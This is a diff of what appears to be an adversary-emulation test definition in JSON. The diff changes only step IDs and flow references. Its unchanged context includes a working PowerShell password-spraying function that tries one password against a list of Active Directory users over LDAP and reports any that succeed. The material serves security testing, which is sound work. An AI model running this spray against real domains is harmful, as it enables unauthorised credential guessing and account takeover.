@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "114e7b9d-9b92-46b7-b34c-a9197d88de27",
+      "id": "c6be6669-581b-44a0-af63-92550ad3a450",
       "type": "execute-command",
       "data": {
         "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "ebdfe829-4164-41b8-a2fb-051149d99289",
+      "id": "2bc5826e-b203-4004-8846-0495f8b58ceb",
       "name": "Check dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "14e7b22e-c979-46ee-a1c6-d82b5f704047",
+      "id": "a0ad3bf6-a257-4b7d-9fcb-338f1ad9d258",
       "name": "Resolve dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "00aafd7e-f3df-48ab-9426-80e277bb4e59",
+      "id": "969bd502-cfa8-4f06-9131-f40c7cfa194b",
       "name": "Re-check dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "ebdfe829-4164-41b8-a2fb-051149d99289",
+      "s": "2bc5826e-b203-4004-8846-0495f8b58ceb",
       "p": "on-success",
-      "o": "114e7b9d-9b92-46b7-b34c-a9197d88de27"
+      "o": "c6be6669-581b-44a0-af63-92550ad3a450"
     },
     {
-      "s": "ebdfe829-4164-41b8-a2fb-051149d99289",
+      "s": "2bc5826e-b203-4004-8846-0495f8b58ceb",
       "p": "on-failure",
-      "o": "14e7b22e-c979-46ee-a1c6-d82b5f704047"
+      "o": "a0ad3bf6-a257-4b7d-9fcb-338f1ad9d258"
     },
     {
-      "s": "14e7b22e-c979-46ee-a1c6-d82b5f704047",
+      "s": "a0ad3bf6-a257-4b7d-9fcb-338f1ad9d258",
       "p": "on-success",
-      "o": "00aafd7e-f3df-48ab-9426-80e277bb4e59"
+      "o": "969bd502-cfa8-4f06-9131-f40c7cfa194b"
     },
     {
-      "s": "00aafd7e-f3df-48ab-9426-80e277bb4e59",
+      "s": "969bd502-cfa8-4f06-9131-f40c7cfa194b",
       "p": "on-failure",
-      "o": "114e7b9d-9b92-46b7-b34c-a9197d88de27"
+      "o": "c6be6669-581b-44a0-af63-92550ad3a450"
     }
   ],
   "tags": [
